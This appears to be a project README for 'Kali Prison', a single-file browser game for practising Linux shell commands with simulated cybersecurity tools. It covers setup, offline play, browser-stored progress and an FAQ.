# Kali Prison v2026 - Game Script Utility 2026

> **A browser-first cybersecurity training game with an embedded Linux shell, terminal-style tasks, and offline play support.** It is built for the web and emphasizes shell practice, simulated tools, and lightweight local progress tracking.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/leotaylor1996/kali-prison-v2026-script?style=flat-square)](https://github.com/leotaylor1996/kali-prison-v2026-script)

---

<p align="center">
  <a href="https://leotaylor1996.github.io/kali-prison-v2026-script/">
    <img src="https://img.shields.io/badge/Download-Kali%20Prison%20Script-brightgreen?style=for-the-badge" alt="Download Kali Prison Script">
  </a>
</p>

> **[Download Kali Prison](https://leotaylor1996.github.io/kali-prison-v2026-script/)**

---

[Download Latest Build](https://leotaylor1996.github.io/kali-prison-v2026-script/)

---

## What It Is

Kali Prison is an educational browser game built around Linux and cybersecurity fundamentals. The experience revolves around terminal interaction, letting players practice shell commands, command pipelines, and familiar CLI workflows in a self-contained web environment.

It ships as a single HTML file and includes an in-memory Linux engine, mocked cybersecurity utilities, and an achievement tracker. Since progress is kept locally in the browser, it is well suited to offline play and short sessions without any extra installation.

---

## Core Features

- In-memory Linux engine for terminal-driven gameplay
- Real shell commands and pipe chains are supported
- Training-oriented simulated cybersecurity tools
- Single-file HTML delivery for easy opening and sharing
- Offline-capable once the page has been loaded
- Progress stored in `localStorage` so sessions can continue
- Milestone-style achievement system
- Designed for React-based web delivery

---

## Getting Started

1. Download the latest build using the link above.
2. Open the supplied HTML file in a current web browser.
3. If you want to keep a local copy, place the file in a folder and open it directly from disk or host it through a basic local web server.

Minimal local example:

- Save the HTML file in a folder such as `kaliprison-browser-game`
- Open it in your browser, or launch it from any simple static hosting setup

---

## Configuration and Usage

Kali Prison is delivered as a browser experience, so most behavior is controlled from inside the game rather than through external flags or launch options.

| Setting | Description |
| --- | --- |
| Shell input | Enter Linux commands directly in the terminal interface |
| Pipes | Chain supported commands using `|` |
| Offline mode | Works without a live connection after loading |
| Save data | Progress is preserved in browser storage |
| Achievements | Track game milestones as you advance |

Example command flow:

`ls | grep flag`

---

## Browser Support and Limits

Kali Prison is meant to run in a web browser as an interactive educational game. The build is self-contained and offline-friendly, so it can be opened locally without installing a separate application.

Known limitations:

- Browser storage is used for progress, so clearing site data may remove saved state
- Terminal behavior depends on the browser environment
- Some command interactions are tied to the game engine rather than a full desktop Linux system

---

## Common Questions

### How do I start using it?
Open the downloaded HTML file in a modern browser, or publish it as a static page and access it from the project link.

### Does it require internet access?
No internet connection is needed after the file is loaded, since the experience is designed to work offline.

### Can I keep my progress?
Yes. Progress is stored in `localStorage`, so it remains available in the same browser profile unless storage is cleared.

### Are shell commands fully supported?
The game includes real command and pipe handling inside its in-memory Linux engine, but the available behavior is limited by the game environment.

### Can I customize the experience?
Customization mainly happens through in-game actions and browser storage state. If you plan to move or share the game, keep the self-contained HTML file intact.

### Is it compatible with mobile browsers?
It is web-based, but the terminal-focused interface is likely best suited to desktop browsers with a physical keyboard.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
